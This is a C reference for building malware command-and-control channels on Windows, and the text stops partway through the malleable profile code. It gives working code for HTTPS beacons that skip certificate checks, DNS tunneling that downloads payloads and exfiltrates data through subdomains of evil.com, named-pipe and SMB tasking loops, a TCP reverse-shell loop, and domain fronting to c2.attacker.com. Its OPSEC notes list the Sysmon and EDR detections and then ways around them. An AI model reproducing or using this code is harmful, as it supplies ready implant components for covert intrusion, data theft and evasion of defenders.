# C2 Communication & Networking

Complete reference for C2 communication channels, transport protocols, traffic disguise, and data encoding. All code is MSVC-compatible C unless noted.

---

## 1. HTTP/HTTPS Callback (WinHTTP)

Full WinHTTP client with POST upload, custom headers, HTTPS cert bypass, and proxy awareness.

```c
#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

// Callback context
typedef struct {
    LPSTR  pResponse;
    DWORD  dwResponseLen;
    DWORD  dwStatusCode;
} HTTP_RESPONSE, *PHTTP_RESPONSE;

// Get IE/system proxy config for current user
BOOL GetSystemProxy(LPWSTR pszProxy, DWORD cchProxy) {
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig = {0};
    if (WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig)) {
        if (proxyConfig.lpszProxy) {
            wcsncpy_s(pszProxy, cchProxy, proxyConfig.lpszProxy, _TRUNCATE);
            GlobalFree(proxyConfig.lpszProxy);
            if (proxyConfig.lpszProxyBypass) GlobalFree(proxyConfig.lpszProxyBypass);
            if (proxyConfig.lpszAutoConfigUrl) GlobalFree(proxyConfig.lpszAutoConfigUrl);
            return TRUE;
        }
        if (proxyConfig.lpszProxyBypass) GlobalFree(proxyConfig.lpszProxyBypass);
        if (proxyConfig.lpszAutoConfigUrl) GlobalFree(proxyConfig.lpszAutoConfigUrl);
    }
    return FALSE;
}

// Full WinHTTP POST request
BOOL WinHttpPost(
    LPCWSTR pszHost,
    INTERNET_PORT nPort,
    LPCWSTR pszPath,
    LPCWSTR pszUserAgent,
    PBYTE   pPostData,
    DWORD   dwPostLen,
    BOOL    bIgnoreCert,
    PHTTP_RESPONSE pResp
) {
    BOOL bResult = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Open session — use system proxy by default
    hSession = WinHttpOpen(
        pszUserAgent,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) return FALSE;

    // Connect to host
    hConnect = WinHttpConnect(hSession, pszHost, nPort, 0);
    if (!hConnect) goto cleanup;

    // Open POST request
    DWORD dwFlags = (nPort == INTERNET_DEFAULT_HTTPS_PORT || nPort == 443)
                    ? WINHTTP_FLAG_SECURE : 0;

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        pszPath,
        NULL,               // HTTP/1.1
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        dwFlags
    );
    if (!hRequest) goto cleanup;

    // HTTPS certificate validation bypass (for self-signed C2 certs)
    if (bIgnoreCert && (dwFlags & WINHTTP_FLAG_SECURE)) {
        DWORD dwSecFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &dwSecFlags, sizeof(dwSecFlags));
    }

    // Add custom headers
    WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/octet-stream\r\n",
        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    WinHttpAddRequestHeaders(hRequest,
        L"X-Request-ID: 7f3a2b\r\n",
        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    // Send the request with POST body
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            pPostData, dwPostLen, dwPostLen, 0))
        goto cleanup;

    // Wait for response
    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup;

    // Get status code
    DWORD dwSize = sizeof(DWORD);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &pResp->dwStatusCode, &dwSize,
        WINHTTP_NO_HEADER_INDEX);

    // Read response body
    pResp->dwResponseLen = 0;
    pResp->pResponse = NULL;
    DWORD dwDownloaded = 0;
    DWORD dwAvail = 0;

    do {
        dwAvail = 0;
        WinHttpQueryDataAvailable(hRequest, &dwAvail);
        if (dwAvail == 0) break;

        LPSTR pBuf = (LPSTR)realloc(pResp->pResponse,
                                     pResp->dwResponseLen + dwAvail + 1);
        if (!pBuf) goto cleanup;
        pResp->pResponse = pBuf;

        WinHttpReadData(hRequest,
                        pResp->pResponse + pResp->dwResponseLen,
                        dwAvail, &dwDownloaded);
        pResp->dwResponseLen += dwDownloaded;
    } while (dwAvail > 0);

    if (pResp->pResponse)
        pResp->pResponse[pResp->dwResponseLen] = '\0';

    bResult = TRUE;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return bResult;
}

// Usage example — beacon callback
void Beacon(LPCWSTR pszC2Host, LPCWSTR pszPath) {
    BYTE checkin[] = { 0x00, 0x01, 0x02, 0x03 }; // beacon ID / metadata
    HTTP_RESPONSE resp = {0};

    if (WinHttpPost(pszC2Host, INTERNET_DEFAULT_HTTPS_PORT, pszPath,
                    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    checkin, sizeof(checkin), TRUE, &resp)) {
        if (resp.dwStatusCode == 200 && resp.pResponse) {
            // Parse tasking from resp.pResponse (resp.dwResponseLen bytes)
        }
        free(resp.pResponse);
    }
}
```

**Proxy-aware variant** using explicit proxy resolution:
```c
BOOL WinHttpPostViaProxy(LPCWSTR pszHost, INTERNET_PORT nPort,
                         LPCWSTR pszPath, PBYTE pData, DWORD dwLen) {
    WCHAR szProxy[512] = {0};
    HINTERNET hSession;

    if (GetSystemProxy(szProxy, 512)) {
        hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NAMED_PROXY,
                               szProxy, WINHTTP_NO_PROXY_BYPASS, 0);
    } else {
        hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    }
    // ... proceed with WinHttpConnect, WinHttpOpenRequest, etc.
    WinHttpCloseHandle(hSession);
    return TRUE;
}
```

> **OPSEC: 🟡 Medium**
> - **Sysmon:** Event ID 3 (Network Connection), Event ID 22 (DNS Query)
> - **ETW:** Microsoft-Windows-WinHttp, Microsoft-Windows-WebIO
> - **EDR Hooks:** WinHttpSendRequest, WinHttpConnect
> - **Signature:** WinHTTP User-Agent pattern, TLS SNI mismatch, unusual POST to high-numbered ports
> - **Mitigation:** Custom User-Agent matching legitimate software (e.g. Chrome update, Outlook), domain fronting, blend URI paths with real web app routes

---

## 2. HTTP/HTTPS Callback (WinInet)

Simpler API, commonly used by commodity malware. More heavily flagged by AV/EDR due to prevalence in malicious samples.

```c
#include <Windows.h>
#include <WinInet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

typedef struct {
    LPSTR  pData;
    DWORD  dwLen;
} INET_RESPONSE;

BOOL WinInetPost(
    LPCSTR pszHost,
    WORD   wPort,
    LPCSTR pszPath,
    LPCSTR pszAgent,
    PBYTE  pPostData,
    DWORD  dwPostLen,
    PINET_RESPONSE pResp
) {
    BOOL bResult = FALSE;
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;

    hInternet = InternetOpenA(
        pszAgent,
        INTERNET_OPEN_TYPE_PRECONFIG, // Use system proxy settings
        NULL, NULL, 0
    );
    if (!hInternet) return FALSE;

    hConnect = InternetConnectA(
        hInternet,
        pszHost,
        wPort,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );
    if (!hConnect) goto cleanup;

    DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (wPort == 443)
        dwFlags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
                 | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

    hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        pszPath,
        "HTTP/1.1",
        NULL,               // No referrer
        NULL,               // Accept all
        dwFlags,
        0
    );
    if (!hRequest) goto cleanup;

    // Certificate bypass for HTTPS
    if (wPort == 443) {
        DWORD dwSecFlags;
        DWORD dwBufLen = sizeof(dwSecFlags);
        InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                             &dwSecFlags, &dwBufLen);
        dwSecFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA
                    | SECURITY_FLAG_IGNORE_REVOCATION;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                           &dwSecFlags, sizeof(dwSecFlags));
    }

    LPCSTR pszHeaders = "Content-Type: application/octet-stream\r\n";
    if (!HttpSendRequestA(hRequest, pszHeaders, (DWORD)strlen(pszHeaders),
                          pPostData, dwPostLen))
        goto cleanup;

    // Read response
    pResp->pData = NULL;
    pResp->dwLen = 0;
    BYTE buf[4096];
    DWORD dwRead = 0;

    while (InternetReadFile(hRequest, buf, sizeof(buf), &dwRead) && dwRead > 0) {
        LPSTR pNew = (LPSTR)realloc(pResp->pData, pResp->dwLen + dwRead + 1);
        if (!pNew) goto cleanup;
        pResp->pData = pNew;
        memcpy(pResp->pData + pResp->dwLen, buf, dwRead);
        pResp->dwLen += dwRead;
    }
    if (pResp->pData)
        pResp->pData[pResp->dwLen] = '\0';

    bResult = TRUE;

cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return bResult;
}
```

> **OPSEC: 🔴 High (flagged)**
> - **Sysmon:** Event ID 3 (Network Connection), Event ID 22 (DNS Query)
> - **ETW:** Microsoft-Windows-WinINet, Microsoft-Windows-WinINet-Capture
> - **EDR Hooks:** HttpSendRequestA/W, InternetConnectA/W heavily hooked
> - **Signature:** WinInet is the most commonly flagged HTTP library in malware; static imports of wininet.dll raise suspicion
> - **Mitigation:** Prefer WinHTTP over WinInet; if WinInet required, resolve imports dynamically via GetProcAddress

---

## 3. DNS Tunneling

### TXT Record Data Retrieval
```c
#include <Windows.h>
#include <windns.h>
#include <stdio.h>
#pragma comment(lib, "Dnsapi.lib")

// Retrieve data encoded in TXT records
BOOL DnsGetTxtData(LPCSTR pszDomain, PBYTE pOutBuf, DWORD cbOutBuf, PDWORD pcbRead) {
    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_A(
        pszDomain,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_WIRE_ONLY,
        NULL,
        &pDnsRecord,
        NULL
    );
    if (status != 0) return FALSE;

    *pcbRead = 0;
    PDNS_RECORD pCur = pDnsRecord;
    while (pCur) {
        if (pCur->wType == DNS_TYPE_TEXT) {
            for (DWORD i = 0; i < pCur->Data.TXT.dwStringCount; i++) {
                DWORD len = (DWORD)strlen(pCur->Data.TXT.pStringArray[i]);
                if (*pcbRead + len > cbOutBuf) break;
                memcpy(pOutBuf + *pcbRead, pCur->Data.TXT.pStringArray[i], len);
                *pcbRead += len;
            }
        }
        pCur = pCur->pNext;
    }
    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    return (*pcbRead > 0);
}
```

### AAAA Record Encoding (16 bytes per record)
```c
// Each AAAA record encodes 16 bytes as an IPv6 address
// Query: <seq>.data.evil.com → AAAA response = 16 bytes of payload
BOOL DnsGetAAAAData(LPCSTR pszDomain, PBYTE pOut16) {
    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_A(
        pszDomain,
        DNS_TYPE_AAAA,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );
    if (status != 0) return FALSE;

    if (pDnsRecord && pDnsRecord->wType == DNS_TYPE_AAAA) {
        // IP6_ADDRESS is 16 bytes
        memcpy(pOut16, &pDnsRecord->Data.AAAA.Ip6Address, 16);
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        return TRUE;
    }
    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    return FALSE;
}

// Reassemble payload from sequential AAAA queries
BOOL DnsDownloadPayload(LPCSTR pszBaseDomain, PBYTE pBuf, DWORD dwChunks) {
    char szQuery[256];
    for (DWORD i = 0; i < dwChunks; i++) {
        sprintf_s(szQuery, sizeof(szQuery), "%u.%s", i, pszBaseDomain);
        if (!DnsGetAAAAData(szQuery, pBuf + (i * 16)))
            return FALSE;
    }
    return TRUE;
}
```

### Subdomain Encoding for Data Exfiltration
```c
// Encode data as hex in subdomain labels: <hex_chunk>.exfil.evil.com
// Max label length = 63 chars → 31 bytes per query (hex-encoded)
BOOL DnsExfilChunk(PBYTE pData, DWORD dwLen, LPCSTR pszBaseDomain) {
    // Hex-encode data into subdomain label
    char szLabel[64] = {0};
    DWORD labelLen = min(dwLen, 31); // 31 bytes → 62 hex chars < 63 limit
    for (DWORD i = 0; i < labelLen; i++)
        sprintf_s(szLabel + (i * 2), 3, "%02x", pData[i]);

    char szQuery[256];
    sprintf_s(szQuery, sizeof(szQuery), "%s.%s", szLabel, pszBaseDomain);

    // Query triggers DNS request carrying data in the subdomain
    PDNS_RECORD pRec = NULL;
    DnsQuery_A(szQuery, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &pRec, NULL);
    if (pRec) DnsRecordListFree(pRec, DnsFreeRecordList);
    return TRUE;
}

// Exfiltrate buffer in chunks
BOOL DnsExfilBuffer(PBYTE pData, DWORD dwLen, LPCSTR pszBaseDomain) {
    DWORD offset = 0;
    while (offset < dwLen) {
        DWORD chunk = min(31, dwLen - offset);
        DnsExfilChunk(pData + offset, chunk, pszBaseDomain);
        offset += chunk;
        Sleep(50 + (GetTickCount() % 200)); // Jitter between queries
    }
    return TRUE;
}
```

> **OPSEC: 🟡 Medium**
> - **Sysmon:** Event ID 22 (DNS Query)
> - **ETW:** Microsoft-Windows-DNS-Client
> - **Signature:** High volume DNS queries, unusually long subdomain labels (>20 chars), frequent TXT/AAAA queries to same domain, high entropy in subdomains
> - **Mitigation:** Rate-limit queries, use short labels, rotate base domains, mix with legitimate DNS traffic, use common record types (A/CNAME) where possible

---

## 4. Named Pipe C2

### Server Side
```c
#include <Windows.h>
#include <stdio.h>

#define PIPE_NAME      "\\\\.\\pipe\\msupdate_47"
#define PIPE_BUF_SIZE  4096

// Named pipe server — bidirectional communication
BOOL PipeServerLoop(void) {
    HANDLE hPipe = CreateNamedPipeA(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,                             // Bidirectional
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,                                              // Max instances
        PIPE_BUF_SIZE,                                  // Out buffer
        PIPE_BUF_SIZE,                                  // In buffer
        0,                                              // Default timeout
        NULL                                            // Default security
    );
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    // Wait for client connection
    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(hPipe);
            return FALSE;
        }
    }

    // Impersonate the connecting client (privilege escalation vector)
    if (ImpersonateNamedPipeClient(hPipe)) {
        // Now running in client's security context
        // Can call OpenThreadToken to get client's token
        HANDLE hToken = NULL;
        OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
        // ... use token ...
        if (hToken) CloseHandle(hToken);
        RevertToSelf();
    }

    // Bidirectional command loop
    BYTE inBuf[PIPE_BUF_SIZE], outBuf[PIPE_BUF_SIZE];
    DWORD dwRead, dwWritten;

    while (TRUE) {
        // Read command from client
        if (!ReadFile(hPipe, inBuf, sizeof(inBuf), &dwRead, NULL) || dwRead == 0)
            break;

        // Process command, build response into outBuf
        DWORD dwOutLen = 0;
        // ... process inBuf[0..dwRead-1], fill outBuf, set dwOutLen ...

        // Send response
        if (!WriteFile(hPipe, outBuf, dwOutLen, &dwWritten, NULL))
            break;
    }

    FlushFileBuffers(hPipe);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return TRUE;
}
```

### Client Side
```c
// Named pipe client — connect and exchange messages
BOOL PipeClientSend(LPCSTR pszPipeName, PBYTE pCmd, DWORD dwCmdLen,
                    PBYTE pRespBuf, DWORD cbRespBuf, PDWORD pdwRespLen) {
    // Wait for pipe to become available (up to 5s)
    if (!WaitNamedPipeA(pszPipeName, 5000))
        return FALSE;

    HANDLE hPipe = CreateFileA(
        pszPipeName,
        GENERIC_READ | GENERIC_WRITE,
        0,              // No sharing
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    // Set pipe to message-read mode
    DWORD dwMode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL);

    // Send command
    DWORD dwWritten;
    if (!WriteFile(hPipe, pCmd, dwCmdLen, &dwWritten, NULL)) {
        CloseHandle(hPipe);
        return FALSE;
    }

    // Read response
    *pdwRespLen = 0;
    BOOL bSuccess = ReadFile(hPipe, pRespBuf, cbRespBuf, pdwRespLen, NULL);

    CloseHandle(hPipe);
    return bSuccess;
}

// Remote pipe client (across network via SMB)
// Use UNC path: \\<remote_host>\pipe\<pipe_name>
void ConnectRemotePipe(LPCSTR pszHost) {
    char szRemotePipe[256];
    sprintf_s(szRemotePipe, sizeof(szRemotePipe),
              "\\\\%s\\pipe\\msupdate_47", pszHost);

    BYTE cmd[] = "TASKING";
    BYTE resp[4096];
    DWORD dwResp;
    PipeClientSend(szRemotePipe, cmd, sizeof(cmd), resp, sizeof(resp), &dwResp);
}
```

> **OPSEC: 🟢 Low (local) / 🟡 Medium (remote)**
> - **Sysmon:** Event ID 17 (Pipe Created), Event ID 18 (Pipe Connected)
> - **ETW:** Microsoft-Windows-Kernel-File (named pipe operations)
> - **EDR Hooks:** CreateNamedPipe, ConnectNamedPipe, ImpersonateNamedPipeClient
> - **Signature:** Named pipe with unusual name, impersonation after pipe connect, remote pipe access over SMB (port 445)
> - **Mitigation:** Use pipe names matching legitimate software (e.g. `\pipe\MSSE-<random>-server`, `\pipe\chrome.<pid>.0`), avoid ImpersonateNamedPipeClient unless needed

---

## 5. SMB C2

File-based command-and-control over SMB shares. Write commands to a file, read responses.

```c
#include <Windows.h>
#include <stdio.h>

#define SMB_SHARE    "\\\\10.0.0.5\\c2share"
#define CMD_FILE     SMB_SHARE "\\tasking.dat"
#define RESP_FILE    SMB_SHARE "\\response.dat"

// Read tasking from SMB share
BOOL SmbReadTasking(PBYTE pBuf, DWORD cbBuf, PDWORD pdwRead) {
    HANDLE hFile = CreateFileA(
        CMD_FILE,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    BOOL bOk = ReadFile(hFile, pBuf, cbBuf, pdwRead, NULL);
    CloseHandle(hFile);

    // Delete tasking file after reading (one-time command)
    DeleteFileA(CMD_FILE);
    return bOk;
}

// Write result back to SMB share
BOOL SmbWriteResponse(PBYTE pData, DWORD dwLen) {
    HANDLE hFile = CreateFileA(
        RESP_FILE,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwWritten;
    BOOL bOk = WriteFile(hFile, pData, dwLen, &dwWritten, NULL);
    CloseHandle(hFile);
    return bOk;
}

// SMB C2 beacon loop
void SmbBeaconLoop(DWORD dwSleepMs) {
    BYTE taskBuf[8192], respBuf[8192];
    DWORD dwRead;

    while (TRUE) {
        if (SmbReadTasking(taskBuf, sizeof(taskBuf), &dwRead) && dwRead > 0) {
            // Process tasking, generate response
            DWORD dwRespLen = 0;
            // ... execute task, fill respBuf, set dwRespLen ...
            SmbWriteResponse(respBuf, dwRespLen);
        }
        Sleep(dwSleepMs);
    }
}
```

**Authenticated SMB access** (connect with explicit credentials):
```c
BOOL SmbConnectWithCreds(LPCSTR pszShare, LPCSTR pszUser, LPCSTR pszPass) {
    NETRESOURCEA nr = {0};
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpRemoteName = (LPSTR)pszShare;

    DWORD dwResult = WNetAddConnection2A(&nr, pszPass, pszUser, CONNECT_TEMPORARY);
    return (dwResult == NO_ERROR);
}
// Link: #pragma comment(lib, "Mpr.lib")
```

> **OPSEC: 🟡 Medium**
> - **Sysmon:** Event ID 3 (Network Connection on port 445), Event ID 11 (File Create), Event ID 23 (File Delete)
> - **ETW:** Microsoft-Windows-SMBClient, Microsoft-Windows-SMBServer
> - **EDR Hooks:** CreateFileA/W with UNC paths, WNetAddConnection2
> - **Signature:** Repeated file creation/deletion on remote shares, unusual SMB traffic patterns, lateral movement indicators
> - **Mitigation:** Use existing administrative shares, mimic legitimate file naming, blend with normal SMB traffic (e.g. SYSVOL access patterns)

---

## 6. Raw TCP Socket

### Winsock TCP Client
```c
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

typedef struct {
    SOCKET sock;
    BOOL   bConnected;
} TCP_CLIENT;

BOOL TcpInit(TCP_CLIENT* pClient) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return FALSE;

    // WSASocket instead of socket() — allows overlapped I/O, less suspicious
    pClient->sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                                NULL, 0, 0);
    if (pClient->sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    pClient->bConnected = FALSE;
    return TRUE;
}

BOOL TcpConnect(TCP_CLIENT* pClient, LPCSTR pszHost, WORD wPort) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(wPort);
    inet_pton(AF_INET, pszHost, &addr.sin_addr);

    if (connect(pClient->sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
        return FALSE;

    pClient->bConnected = TRUE;
    return TRUE;
}

// Non-blocking send/recv with select()
BOOL TcpSendAll(TCP_CLIENT* pClient, PBYTE pData, DWORD dwLen) {
    DWORD dwSent = 0;
    while (dwSent < dwLen) {
        int n = send(pClient->sock, (char*)(pData + dwSent), dwLen - dwSent, 0);
        if (n == SOCKET_ERROR) return FALSE;
        dwSent += n;
    }
    return TRUE;
}

// Non-blocking recv with timeout via select()
int TcpRecvTimeout(TCP_CLIENT* pClient, PBYTE pBuf, DWORD cbBuf, DWORD dwTimeoutMs) {
    fd_set readSet;
    FD_ZERO(&readSet);
    FD_SET(pClient->sock, &readSet);

    struct timeval tv;
    tv.tv_sec = dwTimeoutMs / 1000;
    tv.tv_usec = (dwTimeoutMs % 1000) * 1000;

    int sel = select(0, &readSet, NULL, NULL, &tv);
    if (sel <= 0) return sel; // 0 = timeout, -1 = error

    return recv(pClient->sock, (char*)pBuf, cbBuf, 0);
}

void TcpClose(TCP_CLIENT* pClient) {
    if (pClient->sock != INVALID_SOCKET) {
        closesocket(pClient->sock);
        pClient->sock = INVALID_SOCKET;
    }
    pClient->bConnected = FALSE;
    WSACleanup();
}

// Simple reverse shell pattern
void TcpReverseShell(LPCSTR pszHost, WORD wPort) {
    TCP_CLIENT client;
    if (!TcpInit(&client)) return;
    if (!TcpConnect(&client, pszHost, wPort)) { TcpClose(&client); return; }

    // Length-prefixed message loop
    while (TRUE) {
        DWORD dwMsgLen = 0;
        if (TcpRecvTimeout(&client, (PBYTE)&dwMsgLen, 4, 30000) != 4)
            break;

        PBYTE pMsg = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwMsgLen);
        if (!pMsg) break;

        DWORD dwRecvd = 0;
        while (dwRecvd < dwMsgLen) {
            int n = recv(client.sock, (char*)(pMsg + dwRecvd), dwMsgLen - dwRecvd, 0);
            if (n <= 0) break;
            dwRecvd += n;
        }

        // Process pMsg, send response with length prefix
        // ... execute command, capture output ...

        HeapFree(GetProcessHeap(), 0, pMsg);
    }
    TcpClose(&client);
}
```

> **OPSEC: 🔴 High**
> - **Sysmon:** Event ID 3 (Network Connection) — raw TCP to unusual ports is highly suspicious
> - **ETW:** Microsoft-Windows-Winsock-AFD
> - **EDR Hooks:** WSASocket, connect, send, recv
> - **Signature:** Non-HTTP traffic on non-standard ports, plaintext C2 protocol patterns, long-lived TCP sessions
> - **Mitigation:** Use common ports (80, 443), wrap in TLS (SChannel/OpenSSL), use HTTP framing on raw socket, keep sessions short

---

## 7. Traffic Disguise

### User-Agent Spoofing
```c
// Match real browser User-Agents exactly — rotate per-session
static LPCWSTR g_UserAgents[] = {
    // Chrome on Windows (most common)
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    L"(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    // Edge on Windows
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    L"(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    // Firefox on Windows
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    // Outlook / Microsoft Update (blend with enterprise traffic)
    L"Microsoft-CryptoAPI/10.0",
    L"Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33",
};
#define UA_COUNT (sizeof(g_UserAgents) / sizeof(g_UserAgents[0]))

LPCWSTR GetRandomUA(void) {
    return g_UserAgents[GetTickCount() % UA_COUNT];
}
```

### Domain Fronting Concept
```c
// Domain fronting: TLS SNI shows legitimate domain, HTTP Host header shows C2
// CDN (e.g. CloudFront, Azure CDN) routes based on Host header
//
// TLS connection → legitimate-cdn.example.com  (SNI visible to network monitors)
// HTTP request  → Host: c2.attacker.com        (only CDN sees this)

BOOL DomainFrontedRequest(LPCWSTR pszFrontDomain, LPCWSTR pszRealHost, LPCWSTR pszPath) {
    HINTERNET hSession = WinHttpOpen(GetRandomUA(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Connect to the CDN front domain (this is what appears in DNS/SNI)
    HINTERNET hConnect = WinHttpConnect(hSession, pszFrontDomain,
        INTERNET_DEFAULT_HTTPS_PORT, 0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", pszPath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    // Override Host header to route to real C2 backend
    WCHAR szHostHeader[256];
    swprintf_s(szHostHeader, 256, L"Host: %s\r\n", pszRealHost);
    WinHttpAddRequestHeaders(hRequest, szHostHeader, (DWORD)-1L,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    BOOL bOk = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
        0, NULL, 0, 0, 0);

    // ... WinHttpReceiveResponse, WinHttpReadData ...

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bOk;
}
// Usage: DomainFrontedRequest(L"d1234.cloudfront.net", L"c2.attacker.com", L"/api/update");
```

### Malleable C2 Profile Concept
```c
// Configurable HTTP transaction profile — controls how C2 traffic looks on the wire
typedef struct {
    LPCSTR pszMethod;       // "GET" or "POST"
    LPCSTR pszUri;          // "/api/v2/updates"
    LPCSTR pszHostHeader;   // "updates.microsoft.com"
    LPCSTR pszContentType;  // "application/json"
    LPCSTR pszCookie;       // Session cookie template
    BOOL   bBase64Body;     // Base64-encode body data
    BOOL   bPrependJunk;    // Prepend garbage to body (strip on server)
    DWORD  dwPrependLen;    // Length of junk prepend
} C2_PROFILE;

static const C2_PROFILE g_CheckinProfile = {
    .pszMethod      = "GET",
    .pszUri         = "/v3/links/check",
    .pszHostHeader  = "safebrowsing.googleapis.com",
    .pszContentType = "application/x-protobuf",
    .pszCookie      = "NID=511=",
    .bBase64Body    = TRUE,
    .bPrependJunk   = FALSE,
    .dwPrependLen   = 0,
};

static const C2_PROFILE g_TaskingProfile = {
    .pszMethod      = "POST",
    .pszUri         = "/gts1d4/MFEwTzBNMEswS",
    .pszHostHeader  = "ocsp.pki.goog",
    .pszContentType = "application/ocsp-request",
    .pszCookie      = NULL,
    .bBase64Body    = FALSE,
    .bPrependJunk   = TRUE,
    .dwPrependLen   = 128,
};

// Apply profile to an HTTP request
void ApplyProfile(const C2_PROFILE* pProfile, PBYTE pData, DWORD dwLen,
                  PBYTE* ppTransformed, PDWORD pdwTransformedLen) {
    DWORD dwOutLen = dwLen;
    PBYTE pOut = NULL;

    if (pProfile->bPrependJunk) {
        dwOutLen = pProfile->dwPrependLen + dwLen;
        pOut = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwOutLen);
        // Fill prepend with random bytes
        for (DWORD i = 0; i < pProfile->dwPrependLen; i++)
            pOut[i] = (BYTE)(GetTickCount() + i);
        memcpy(pOut + pProfile->dwPrependLen, pData, dwLen);
    } else if (pProfile->bBase64Body) {
        // Base64 encode — see Data Encoding section below
        // CryptBinaryToStringA(pData, dwLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, ...)
